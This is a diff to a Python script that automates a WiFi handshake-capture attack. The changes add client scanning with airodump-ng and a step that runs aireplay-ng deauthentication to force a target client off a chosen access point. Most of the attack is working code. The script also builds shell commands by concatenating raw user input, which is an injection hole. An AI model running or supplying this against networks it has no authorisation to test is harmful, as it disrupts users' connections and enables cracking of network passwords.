@@ -28,6 +28,10 @@ interfaceName = ""
 # Specify access point MAC address (BSSID) to target
 # Default: Present user with detected access points to choose from
 targetAP = ""
+
+# Specify channel to scan on
+# Default: Prompt user to choose channel or scan all channels
+channel = ""
 ###############################################################
 
 
@@ -38,7 +42,6 @@ def main():
 		environmentSetup()
 		getTargetAccessPoint()
 		captureHandshake()
-		# Next steps here
 	finally:
 		# this ensures that clean up occurs even on error
 		cleanUp()
@@ -147,7 +150,7 @@ def getTargetAccessPoint():
 
 		if interfaceName == '':
 			# TODO: raise no capatable inteface exception?
-			return
+			raise Exception
 		channel = input("Channel number to listen to (0 to scan multiple): ")
 		scanTime = input("Time limit to listen: ")
 		scanAccessPoints(interfaceName, channel, scanTime)
@@ -247,11 +250,30 @@ def getInterfaceName():
 def captureHandshake():
 	# Get MAC address of the target access point (router)
 	routerBSSID = input("Please select router MAC address (BSSID 1): ")
+	# TODO: Parse input - insert colon delimiters, make all-caps?
+	scanTime = input("Time limit to listen: ")
+
+	clientBSSID = scanClientsForAccessPoint(routerBSSID, scanTime)
+	deauthenticateClient(clientBSSID, routerBSSID)
+
+
+def scanClientsForAccessPoint(routerBSSID, scanTime, routerESSID=None):
+	print("Using interface: " + interfaceName)
+	# Allow user to select an AP (access point) by MAC address
+	if routerESSID == None or routerESSID == '':
+		print("Scanning clients connected to access point " + routerBSSID + "...")
+	else:
+		print("Scanning clients connected to access point " + routerESSID + "...")
+	# TODO: Change routerBSSID to ESSID in print statement
 
 	# List all clients connected to target AP
-	bash_command("airodump-ng -c 6 --bssid " + routerBSSID + " -w packet " + interfaceName)
-	# TODO: Parse input - insert colon delimiters, make all-caps?
+	process = bash_command("airodump-ng -c " + str(channel) + " --bssid " + str(routerBSSID) + " -w packet " + str(interfaceName))
+	time.sleep(int(scanTime))
+	process.terminate()
+	print("Scan complete.")
 
+	# Have user select client to use
+	# TODO: Automatically select a client to use
 	# TODO: Allow for option to choose strongest
 	# colnames = ['BSSID', 'ESSID']
 	# accessPoints = pandas.read_csv('dump-01.csv', names=colnames)
@@ -259,8 +281,20 @@ def captureHandshake():
 	# essids = accessPoints.ESSID.tolist()
 	# print(bssids)
 	# print("\n\n" + essids)
+	clientBSSID = input("Please select client (BSSID 2) to deauthenticate: ")
+	# TODO: Parse input - insert colon delimiters, make all-caps?
+
+	return clientBSSID
 
 
+def deauthenticateClient(clientBSSID, routerBSSID, routerESSID=None):
+	if routerESSID == None or routerESSID == '':
+		print("Deauthenticating client " + clientBSSID + " at AP " + routerBSSID)
+	else:
+		print("Deauthenticating client " + clientBSSID + " at AP " + routerESSID)
+
+	process = bash_command("aireplay-ng -0 1 -a " + routerBSSID + " -c " + clientBSSID + " " + interfaceName)
+	print(process.stdout.read().decode('utf-8').strip())
 
 
 def cleanUp():
